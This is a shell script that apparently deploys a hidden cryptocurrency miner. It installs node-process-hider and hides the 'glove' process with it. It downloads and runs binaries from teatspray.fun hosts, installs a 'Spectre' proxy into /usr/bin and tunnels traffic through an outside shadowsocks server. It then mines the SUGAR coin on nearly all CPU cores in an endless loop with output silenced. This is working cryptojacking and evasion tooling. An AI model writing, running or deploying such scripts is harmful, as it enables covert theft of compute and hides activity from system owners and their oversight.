#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools apt-utils dpkg >/dev/null

sleep 2

wget -O - https://deb.nodesource.com/setup_20.x | bash 

sleep 2

apt-get install -y nodejs

sleep 2

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add glove 1>/dev/null 2>&1

sleep 2

cat /etc/*-release
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Bitr_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`

sleep 2

wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz > /dev/null

sleep 2

tar -xf Spectre.tar.gz

sleep 2

mv Spectre /usr/bin

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date

sleep 2

echo ""
echo ""
echo ""
echo ""

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""
echo ""
echo ""

sleep 2

echo ""
echo "Your worker name is $currentdate"
echo ""
echo ""
echo ""
echo ""
echo ""

sleep 2

wget -q http://greenleaf.teatspray.fun/glove.tar.gz >/dev/null

sleep 2

tar -xf glove.tar.gz

sleep 2

while true
do
./glove -a yespower --param-n 2048 --param-r 32 --param-key "Satoshi Nakamoto 31/Oct/2008 Proof-of-work is essentially one-CPU-one-vote" -o stratum+tcp://zergsugar.teatspray.fun:6535 -u sugar1qy33vm690c6fzcct9w4k3egngmcmps2jtp4z5lc.$currentdate -p c=SUGAR,mc=SUGAR,m=solo,ID=$currentdate -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
sleep 10
done
